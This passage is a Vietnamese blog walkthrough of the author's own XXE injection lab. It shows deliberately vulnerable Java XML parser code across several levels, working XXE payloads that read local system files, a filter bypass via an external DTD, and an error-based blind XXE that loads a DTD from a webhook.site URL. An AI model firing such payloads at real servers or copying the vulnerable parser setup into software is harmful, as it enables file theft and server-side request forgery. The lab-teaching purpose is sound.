<!DOCTYPE html><html lang="[&quot;en&quot;,&quot;vi&quot;,&quot;default&quot;]" data-theme="dark"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1.0,viewport-fit=cover"><title>XXE Injection Vulnerability Lab | Phat Mai Blog</title><meta name="author" content="Phat Mai"><meta name="copyright" content="Phat Mai"><meta name="format-detection" content="telephone=no"><meta name="theme-color" content="#0d0d0d"><meta name="description" content="XXE Injection Vulnerability LabXXE Injection là gì?XXE (XML External Entity) Injection là một lỗ hổng bảo mật web cho phép kẻ tấn công can thiệp vào quá trình một ứng dụng xử lý dữ liệu XML. Lỗ hổng n">
<meta property="og:type" content="article">
<meta property="og:title" content="XXE Injection Vulnerability Lab">
<meta property="og:url" content="https://pzhat.github.io/2025/11/15/2025-09-28-XXE-Injection/index.html">
<meta property="og:site_name" content="Phat Mai Blog">
<meta property="og:description" content="XXE Injection Vulnerability LabXXE Injection là gì?XXE (XML External Entity) Injection là một lỗ hổng bảo mật web cho phép kẻ tấn công can thiệp vào quá trình một ứng dụng xử lý dữ liệu XML. Lỗ hổng n">
<meta property="og:locale" content="en_US">
<meta property="og:image" content="https://pzhat.github.io/img/avatar.jpg">
<meta property="article:published_time" content="2025-11-14T19:34:38.226Z">
<meta property="article:modified_time" content="2025-10-24T05:38:35.000Z">
<meta property="article:author" content="Phat Mai">
<meta property="article:tag" content="Web">
<meta name="twitter:card" content="summary">
<meta name="twitter:image" content="https://pzhat.github.io/img/avatar.jpg"><script type="application/ld+json">{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "XXE Injection Vulnerability Lab",
  "url": "https://pzhat.github.io/2025/11/15/2025-09-28-XXE-Injection/",
  "image": "https://pzhat.github.io/img/avatar.jpg",
  "datePublished": "2025-11-14T19:34:38.226Z",
  "dateModified": "2025-10-24T05:38:35.000Z",
  "author": [
    {
      "@type": "Person",
      "name": "Phat Mai",
      "url": "https://pzhat.github.io"
    }
  ]
}</script><link rel="shortcut icon" href="/img/favicon.png"><link rel="canonical" href="https://pzhat.github.io/2025/11/15/2025-09-28-XXE-Injection/index.html"><link rel="preconnect" href="//cdn.jsdelivr.net"/><link rel="preconnect" href="//busuanzi.ibruce.info"/><link rel="stylesheet" href="/css/index.css?v=5.5.2"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@7.1.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fancyapps/ui@6.1.4/dist/fancybox/fancybox.min.css" media="print" onload="this.media='all'"><script>
    (() => {
      
    const saveToLocal = {
      set: (key, value, ttl) => {
        if (!ttl) return
        const expiry = Date.now() + ttl * 86400000
        localStorage.setItem(key, JSON.stringify({ value, expiry }))
      },
      get: key => {
        const itemStr = localStorage.getItem(key)
        if (!itemStr) return undefined
        const { value, expiry } = JSON.parse(itemStr)
        if (Date.now() > expiry) {
          localStorage.removeItem(key)
          return undefined
        }
        return value
      }
    }

    window.btf = {
      saveToLocal,
      getScript: (url, attr = {}) => new Promise((resolve, reject) => {
        const script = document.createElement('script')
        script.src = url
        script.async = true
        Object.entries(attr).forEach(([key, val]) => script.setAttribute(key, val))
        script.onload = script.onreadystatechange = () => {
          if (!script.readyState || /loaded|complete/.test(script.readyState)) resolve()
        }
        script.onerror = reject
        document.head.appendChild(script)
      }),
      getCSS: (url, id) => new Promise((resolve, reject) => {
        const link = document.createElement('link')
        link.rel = 'stylesheet'
        link.href = url
        if (id) link.id = id
        link.onload = link.onreadystatechange = () => {
          if (!link.readyState || /loaded|complete/.test(link.readyState)) resolve()
        }
        link.onerror = reject
        document.head.appendChild(link)
      }),
      addGlobalFn: (key, fn, name = false, parent = window) => {
        if (!false && key.startsWith('pjax')) return
        const globalFn = parent.globalFn || {}
        globalFn[key] = globalFn[key] || {}
        globalFn[key][name || Object.keys(globalFn[key]).length] = fn
        parent.globalFn = globalFn
      }
    }
  
      
      const activateDarkMode = () => {
        document.documentElement.setAttribute('data-theme', 'dark')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', '#0d0d0d')
        }
      }
      const activateLightMode = () => {
        document.documentElement.setAttribute('data-theme', 'light')
        if (document.querySelector('meta[name="theme-color"]') !== null) {
          document.querySelector('meta[name="theme-color"]').setAttribute('content', 'ffffff')
        }
      }

      btf.activateDarkMode = activateDarkMode
      btf.activateLightMode = activateLightMode

      const theme = saveToLocal.get('theme')
    
          theme === 'dark' ? activateDarkMode() : theme === 'light' ? activateLightMode() : null
        
      
      const asideStatus = saveToLocal.get('aside-status')
      if (asideStatus !== undefined) {
        document.documentElement.classList.toggle('hide-aside', asideStatus === 'hide')
      }
    
      
    const detectApple = () => {
      if (/iPad|iPhone|iPod|Macintosh/.test(navigator.userAgent)) {
        document.documentElement.classList.add('apple')
      }
    }
    detectApple()
  
    })()
  </script><script>const GLOBAL_CONFIG = {
  root: '/',
  algolia: undefined,
  localSearch: undefined,
  translate: undefined,
  highlight: {"plugin":"highlight.js","highlightCopy":true,"highlightLang":true,"highlightHeightLimit":false,"highlightFullpage":false,"highlightMacStyle":true},
  copy: {
    success: 'Copy Successful',
    error: 'Copy Failed',
    noSupport: 'Browser Not Supported'
  },
  relativeDate: {
    homepage: false,
    post: false
  },
  runtime: '',
  dateSuffix: {
    just: 'Just now',
    min: 'minutes ago',
    hour: 'hours ago',
    day: 'days ago',
    month: 'months ago'
  },
  copyright: undefined,
  lightbox: 'fancybox',
  Snackbar: undefined,
  infinitegrid: {
    js: 'https://cdn.jsdelivr.net/npm/@egjs/infinitegrid@4.12.0/dist/infinitegrid.min.js',
    buttonText: 'Load More'
  },
  isPhotoFigcaption: false,
  islazyloadPlugin: false,
  isAnchor: false,
  percent: {
    toc: true,
    rightside: false,
  },
  autoDarkmode: false
}</script><script id="config-diff">var GLOBAL_CONFIG_SITE = {
  title: 'XXE Injection Vulnerability Lab',
  isHighlightShrink: false,
  isToc: true,
  pageType: 'post'
}</script><link rel="stylesheet" href="/css/mobile-cover-fix.css"><meta name="generator" content="Hexo 8.1.1"></head><body><div id="loading-box"><div class="loading-left-bg"></div><div class="loading-right-bg"></div><div class="spinner-box"><div class="configure-border-1"><div class="configure-core"></div></div><div class="configure-border-2"><div class="configure-core"></div></div><div class="loading-word">Loading...</div></div></div><script>(()=>{
  const $loadingBox = document.getElementById('loading-box')
  const $body = document.body
  const preloader = {
    endLoading: () => {
      if ($loadingBox.classList.contains('loaded')) return
      $body.style.overflow = ''
      $loadingBox.classList.add('loaded')
    },
    initLoading: () => {
      $body.style.overflow = 'hidden'
      $loadingBox.classList.remove('loaded')
    }
  }

  preloader.initLoading()

  if (document.readyState === 'complete') {
    preloader.endLoading()
  } else {
    window.addEventListener('load', preloader.endLoading)
    document.addEventListener('DOMContentLoaded', preloader.endLoading)
    // Add timeout protection: force end after 7 seconds
    setTimeout(preloader.endLoading, 7000)
  }

  if (false) {
    btf.addGlobalFn('pjaxSend', preloader.initLoading, 'preloader_init')
    btf.addGlobalFn('pjaxComplete', preloader.endLoading, 'preloader_end')
  }
})()</script><div id="web_bg" style="background-image: url(/img/background2.jpg);"></div><div id="sidebar"><div id="menu-mask"></div><div id="sidebar-menus"><div class="avatar-img text-center"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="site-data text-center"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">38</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">8</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div></div></div><div class="post" id="body-wrap"><header class="post-bg" id="page-header" style="background-image: url(/img/cover.jpg);"><nav id="nav"><span id="blog-info"><a class="nav-site-title" href="/"><span class="site-name">Phat Mai Blog</span></a><a class="nav-page-title" href="/"><span class="site-name">XXE Injection Vulnerability Lab</span><span class="site-name"><i class="fa-solid fa-circle-arrow-left"></i><span>  Back to Home</span></span></a></span><div id="menus"><div class="menus_items"><div class="menus_item"><a class="site-page" href="/"><i class="fa-fw fas fa-home"></i><span> Home</span></a></div><div class="menus_item"><a class="site-page" href="/archives/"><i class="fa-fw fas fa-archive"></i><span> Archives</span></a></div><div class="menus_item"><a class="site-page" href="/categories/"><i class="fa-fw fas fa-folder"></i><span> Categories</span></a></div><div class="menus_item"><a class="site-page" href="/tags/"><i class="fa-fw fas fa-tags"></i><span> Tags</span></a></div><div class="menus_item"><a class="site-page" href="/about/"><i class="fa-fw fas fa-user"></i><span> About</span></a></div></div><div id="toggle-menu"><span class="site-page"><i class="fas fa-bars fa-fw"></i></span></div></div></nav><div id="post-info"><h1 class="post-title">XXE Injection Vulnerability Lab</h1><div id="post-meta"><div class="meta-firstline"><span class="post-meta-date"><i class="far fa-calendar-alt fa-fw post-meta-icon"></i><span class="post-meta-label">Created</span><time class="post-meta-date-created" datetime="2025-11-14T19:34:38.226Z" title="Created 2025-11-15 02:34:38">2025-11-15</time><span class="post-meta-separator">|</span><i class="fas fa-history fa-fw post-meta-icon"></i><span class="post-meta-label">Updated</span><time class="post-meta-date-updated" datetime="2025-10-24T05:38:35.000Z" title="Updated 2025-10-24 12:38:35">2025-10-24</time></span><span class="post-meta-categories"><span class="post-meta-separator">|</span><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/">pentesting</a><i class="fas fa-angle-right post-meta-separator"></i><i class="fas fa-inbox fa-fw post-meta-icon"></i><a class="post-meta-categories" href="/categories/pentesting/Web-Exploitation/">Web-Exploitation</a></span></div><div class="meta-secondline"><span class="post-meta-separator">|</span><span class="post-meta-pv-cv" id="" data-flag-title=""><i class="far fa-eye fa-fw post-meta-icon"></i><span class="post-meta-label">Post Views:</span><span id="busuanzi_value_page_pv"><i class="fa-solid fa-spinner fa-spin"></i></span></span></div></div></div></header><main class="layout" id="content-inner"><div id="post"><article class="container post-content" id="article-container"><h1 id="XXE-Injection-Vulnerability-Lab"><a href="#XXE-Injection-Vulnerability-Lab" class="headerlink" title="XXE Injection Vulnerability Lab"></a>XXE Injection Vulnerability Lab</h1><h3 id="XXE-Injection-la-gi"><a href="#XXE-Injection-la-gi" class="headerlink" title="XXE Injection là gì?"></a>XXE Injection là gì?</h3><p>XXE (XML External Entity) Injection là một lỗ hổng bảo mật web cho phép kẻ tấn công can thiệp vào quá trình một ứng dụng xử lý dữ liệu XML. Lỗ hổng này xảy ra khi một trình phân tích (parser) XML được cấu hình yếu xử lý các thực thể bên ngoài (external entities) do người dùng cung cấp trong tài liệu XML.</p>
<p>Khai thác thành công lỗ hổng XXE có thể dẫn đến nhiều hậu quả nghiêm trọng, bao gồm:</p>
<ul>
<li><strong>Đọc file tùy ý:</strong> Kẻ tấn công có thể đọc các file nhạy cảm trên hệ thống file của máy chủ, chẳng hạn như file cấu hình, mã nguồn, hoặc các file chứa thông tin người dùng (<code>/etc/passwd</code>).</li>
<li><strong>Giả mạo yêu cầu phía máy chủ (SSRF - Server-Side Request Forgery):</strong> Buộc ứng dụng phải thực hiện các yêu cầu đến các hệ thống khác mà nó có thể truy cập, kể cả các hệ thống trong mạng nội bộ.</li>
<li><strong>Tấn công từ chối dịch vụ (DoS - Denial of Service):</strong> Gây cạn kiệt tài nguyên của máy chủ, làm cho ứng dụng ngừng hoạt động (ví dụ: tấn công “Billion Laughs”).</li>
<li><strong>Thực thi mã từ xa (RCE - Remote Code Execution):</strong> Trong một số trường hợp hiếm hoi, XXE có thể dẫn đến việc thực thi mã lệnh từ xa trên máy chủ.</li>
</ul>
<h3 id="Overview"><a href="#Overview" class="headerlink" title="Overview"></a>Overview</h3><p><img src="https://hackmd.io/_uploads/rkUHHmE3le.png" alt="image"></p>
<p>Với XXE thì mình tạo thẳng một giao diện để gửi thẳng payload vào và server sẽ trả thẳng kết quả của payload về vì ở đây với XXE theo các bài mình đã làm thì hầu như API nó đều hiện rõ phần nơi để mình inject nên mình sẽ là một api thẳng như này luôn.</p>
<p>Chỉ có khác ở level 7 ta sẽ làm chức năng upload file để có thể XXE bằng SVG qua File Upload.</p>
<p>Lab này xử lý logic chính ở file <code>XmlParserService.java</code> với 7 levels với 7 độ khó tăng dần với các lớp filter khác nhau.</p>
<h3 id="Source-Code"><a href="#Source-Code" class="headerlink" title="Source Code"></a>Source Code</h3><p><a target="_blank" rel="noopener" href="https://github.com/pzhat/XXE_Injection_lab">GitHub</a></p>
<h3 id="Khai-thac-tung-level-va-POC"><a href="#Khai-thac-tung-level-va-POC" class="headerlink" title="Khai thác từng level và POC"></a>Khai thác từng level và POC</h3><h4 id="Level-1"><a href="#Level-1" class="headerlink" title="Level 1:"></a>Level 1:</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">parseLevel1</span><span class="params">(String xml)</span> &#123;</span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> createVulnerableBuilder().parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(xml)));</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;Parsed XML content: &quot;</span> + doc.getDocumentElement().getTextContent();</span><br><span class="line">     &#125; <span class="keyword">catch</span> (Exception e) &#123; <span class="keyword">return</span> <span class="string">&quot;Error: &quot;</span> + e.getMessage(); &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

<p>Ở level đầu tiên này nó sẽ chỉ là chức năng parser XML và return kết quả về với level này ta thấy sẽ không hề có lớp filter nào cả.</p>
<p>Ta sẽ test thử payload:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">data</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="keyword">xxe</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///c:/windows/system32/drivers/etc/hosts&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><code>&lt;?xml version=&quot;1.0&quot;?&gt;</code>: Khai báo phiên bản XML.</p>
<p><code>&lt;!DOCTYPE data [...]&gt;</code>: Khai báo DTD (Document Type Definition), cho phép định nghĩa các thực thể (entities).</p>
<p><code>&lt;!ENTITY xxe SYSTEM &quot;file:///...&quot;&gt;</code>: Định nghĩa một thực thể bên ngoài (external entity) tên là xxe, trỏ đến file hệ thống hosts trên Windows.</p>
<p><code>&lt;data&gt;&amp;xxe;&lt;/data&gt;</code>: Gọi thực thể xxe, khiến trình phân tích XML cố gắng đọc nội dung file hosts và chèn vào vị trí này.</p>
<p><img src="https://hackmd.io/_uploads/B1xy36mNngx.png" alt="image"></p>
<p>Thành công đọc được file <code>hosts</code> bằng cách gọi System với file protocol.</p>
<h4 id="Level-2"><a href="#Level-2" class="headerlink" title="Level 2:"></a>Level 2:</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">parseLevel2</span><span class="params">(String xml)</span> &#123;</span><br><span class="line">       <span class="keyword">if</span> (xml.toLowerCase().contains(<span class="string">&quot;system&quot;</span>) || xml.toLowerCase().contains(<span class="string">&quot;file://&quot;</span>)) &#123;</span><br><span class="line">           <span class="keyword">return</span> <span class="string">&quot;Malicious input detected by filter!&quot;</span>;</span><br><span class="line">       &#125;</span><br><span class="line">       <span class="keyword">return</span> parseLevel1(xml);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>Đến với level 2 có thể thấy bây giờ đã có lớp filter <code>file</code> protocol lại cùng với đó ta cũng sẽ không thể gọi <code>system</code> được nữa nếu trong câu XML có 2 cái trên sẽ bị trả về <code>Malicious input detected by filter!</code>.</p>
<p>Ở đây thì payload level 1 đã không còn tác dụng nữa nên ta sẽ tìm hướng đi khác.</p>
<p>Sau khi tìm hiểu thì ta hoàn toàn có thể sử dụng cách tạo <code>external dtd</code> để bypass được lớp filter kia.</p>
<p><img src="https://hackmd.io/_uploads/H1tX5EUhll.png" alt="image"></p>
<p>Tạo file <code>evil_v2.dtd</code> với nội dung:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY x <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/Windows/win.ini&quot;</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/Bk9U9ELnll.png" alt="image"></p>
<p>Tiến hành host nó lên localhost với port là 8000.</p>
<p>Sau đó ta tiến hành truyền payload vào:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">foo</span> <span class="keyword">PUBLIC</span> <span class="string">&quot;X&quot;</span> <span class="string">&quot;http://localhost:8000/evil_v2.dtd&quot;</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">foo</span>&gt;</span><span class="symbol">&amp;x;</span><span class="tag">&lt;/<span class="name">foo</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>Ở đây ta dùng <code>PUBLIC</code> cùng với đó là biến <code>X</code> khi truyền vào nó sẽ gọi file trong localhost mà mình đã tạo sẵn payload và truyền xml vào.</p>
<p><img src="https://hackmd.io/_uploads/BJ0Qs4L3xx.png" alt="image"></p>
<p>Thành công khai thác ở level này.</p>
<h4 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3:"></a>Level 3:</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">parseLevel3</span><span class="params">(String xml)</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (xml.toLowerCase().contains(<span class="string">&quot;&lt;!doctype&quot;</span>)) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Malicious DTD detected by filter!&quot;</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> parseLevel1(xml);</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>Ở level 3 này có thể thấy cụm <code>&lt;!doctype</code> đã bị filter lại làm cho việc khai thác trở nên không thể.</p>
<p>Level 3 hiện TẮT khả năng XXE chỉ bằng một filter duy nhất vào chuỗi “&lt;!doctype”. Chuẩn XML không cho viết DOCTYPE “biến tấu” hợp lệ mà không chứa chuỗi này → Không có DTD → Không khai báo entity → Không XXE đọc file. Không có cơ chế phụ nào (XInclude&#x2F;schema&#x2F;XSLT) để pivot. &#x3D;&gt; Không còn vector XXE thực tế nào.</p>
<p>Nên đây là một level gọi là secure vì không có doctype thì hầu như không payload nào XXE còn hoạt động được nữa.</p>
<h4 id="Level-4"><a href="#Level-4" class="headerlink" title="Level 4:"></a>Level 4:</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">parseLevel4</span><span class="params">(String xml)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Document</span> <span class="variable">doc</span> <span class="operator">=</span> createSecureBuilder().parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(xml)));</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Parsed XML content (securely): &quot;</span> + doc.getDocumentElement().getTextContent();</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123; <span class="keyword">return</span> <span class="string">&quot;Error: &quot;</span> + e.getMessage(); &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>Ở đây ta gọi đến hàm <code>createSecureBuilder()</code>:</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">private</span> DocumentBuilder <span class="title function_">createSecureBuilder</span><span class="params">()</span> <span class="keyword">throws</span> ParserConfigurationException &#123;</span><br><span class="line">    <span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">    dbf.setFeature(<span class="string">&quot;http://apache.org/xml/features/disallow-doctype-decl&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">    dbf.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">    dbf.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-parameter-entities&quot;</span>, <span class="literal">false</span>);</span><br><span class="line">    dbf.setXIncludeAware(<span class="literal">false</span>);</span><br><span class="line">    dbf.setExpandEntityReferences(<span class="literal">false</span>);</span><br><span class="line">    <span class="keyword">return</span> dbf.newDocumentBuilder();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>Nó đã sử dụng bật tắt các feature để cấm XXE như là : </p>
<ul>
<li><a target="_blank" rel="noopener" href="http://apache.org/xml/features/disallow-doctype-decl">http://apache.org/xml/features/disallow-doctype-decl</a> </li>
<li><a target="_blank" rel="noopener" href="http://xml.org/sax/features/external-general-entities">http://xml.org/sax/features/external-general-entities</a> </li>
<li><a target="_blank" rel="noopener" href="http://xml.org/sax/features/external-parameter-entities">http://xml.org/sax/features/external-parameter-entities</a> </li>
<li>setXIncludeAware(false)</li>
<li>setExpandEntityReferences(false)</li>
<li>newDocumentBuilder()</li>
</ul>
<p>Từ đó thành công ngăn chặn đi các payload XXE được inject vào nên dù test với payload nào cũng sẽ bị chặn lại.</p>
<p><strong>Level 4 secure vì:</strong></p>
<p>Loại bỏ DOCTYPE (gốc của XXE entity)<br>Vô hiệu hóa external entities (kể cả nếu ai đó bật lại DOCTYPE)<br>Tắt XInclude<br>Không mở kênh schema &#x2F; stylesheet → Tất cả vector XXE phổ biến bị triệt.</p>
<h4 id="Level-5"><a href="#Level-5" class="headerlink" title="Level 5:"></a>Level 5:</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">parseLevel5</span><span class="params">(String xml)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="comment">// Vulnerable parser, but the response doesn&#x27;t show the content</span></span><br><span class="line">            createVulnerableBuilder().parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(xml)));</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Data processed successfully.&quot;</span>; <span class="comment">// No content is returned</span></span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="string">&quot;Error: &quot;</span> + e.getMessage();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure>

<p>Ở đây theo phân tích code thì ta thấy rằng:</p>
<ul>
<li>Dùng parser “vulnerable” (DocumentBuilder mặc định) → CHO PHÉP DOCTYPE + external entity.</li>
<li>KHÔNG in ra nội dung XML.</li>
</ul>
<p>Vì không trả về nội dung XML nên ta có thể suy đoán tình huống này là Blind XXE với tình huống này ta sẽ nghĩ cách để đưa được output ra ngoài hoặc ta sẽ làm nó tạo ra lỗi và vô tình in ra kết quả (Error Based).</p>
<p>Ta sẽ sử dụng webhook để tiến hành tấn công thử.</p>
<p><img src="https://hackmd.io/_uploads/HJYKx1vnle.png" alt="image"></p>
<p>Tạo một url mới của webhook có chứa nội dung xml payload:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">file</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;file:///C:/Windows/win.ini&quot;</span>&gt;</span></span><br><span class="line"><span class="meta">&lt;!ENTITY % <span class="keyword">eval</span> <span class="string">&quot;&lt;!ENTITY &amp;#x25; error SYSTEM &#x27;file:///%file;&#x27;&gt;&quot;</span>&gt;</span></span><br><span class="line">%eval;</span><br><span class="line">%error;</span><br></pre></td></tr></table></figure>

<p>Sau đó đưa payload khác gọi đến webhook với mong muốn là nó sẽ nổ lỗi kèm theo đó là kết quả hoặc là kết quả sẽ được trả về trong response:</p>
<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span>?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="keyword">root</span> [</span></span><br><span class="line"><span class="meta">    <span class="meta">&lt;!ENTITY % <span class="keyword">remote</span> <span class="keyword">SYSTEM</span> <span class="string">&quot;https://webhook.site/89cc7c4f-6ced-454a-9261-80bcea95157e&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">    %remote;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">root</span>/&gt;</span></span><br></pre></td></tr></table></figure>

<p><img src="https://hackmd.io/_uploads/HyjjW1wnlg.png" alt="image"></p>
<p><img src="https://hackmd.io/_uploads/By5abkPhll.png" alt="image"></p>
<p>Thành công tạo ra lỗi kèm theo đó nó trả về dữ liệu ở đây là trường hợp Error Based.</p>
<h4 id="Level-6"><a href="#Level-6" class="headerlink" title="Level 6:"></a>Level 6:</h4><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> String <span class="title function_">parseLevel6</span><span class="params">(String xml)</span> &#123;</span><br><span class="line">     <span class="comment">// This level has a specific configuration that reveals errors</span></span><br><span class="line">     <span class="keyword">try</span> &#123;</span><br><span class="line">         <span class="type">DocumentBuilderFactory</span> <span class="variable">dbf</span> <span class="operator">=</span> DocumentBuilderFactory.newInstance();</span><br><span class="line">         <span class="comment">// It allows external DTDs but might have issues resolving them, leading to errors</span></span><br><span class="line">         dbf.setFeature(<span class="string">&quot;http://xml.org/sax/features/external-general-entities&quot;</span>, <span class="literal">true</span>);</span><br><span class="line">         <span class="type">DocumentBuilder</span> <span class="variable">dBuilder</span> <span class="operator">=</span> dbf.newDocumentBuilder();</span><br><span class="line">         dBuilder.parse(<span class="keyword">new</span> <span class="title class_">InputSource</span>(<span class="keyword">new</span> <span class="title class_">StringReader</span>(xml)));</span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;Data processed.&quot;</span>;</span><br><span class="line">     &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">         <span class="comment">// The error message itself is the vulnerability</span></span><br><span class="line">         <span class="keyword">return</span> <span class="string">&quot;An exception occurred: &quot;</span> + e.toString();</span><br><span class="line">     &#125;</span><br><span class="line"> &#125;</span><br></pre></td></tr></table></figure>

